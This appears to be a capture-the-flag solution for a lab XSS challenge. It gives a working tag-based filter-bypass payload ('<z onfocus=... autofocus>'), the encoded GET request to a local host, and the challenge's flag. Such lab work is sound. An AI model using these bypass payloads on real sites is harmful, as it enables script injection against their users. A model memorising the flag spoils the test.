@@ -1,0 +1,4 @@
+# XSS filter bypass using <z> tag (off-by-one: filter blocks <a-y> but not <z>). Payload: <z onfocus=alert('XSS') autofocus>. Returns flag{9541cc02-59a2-4171-8d30-5530ec31d825}
+
+GET /page?name=%3Cz+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E HTTP/1.1
+Host: 172.17.0.1:50665
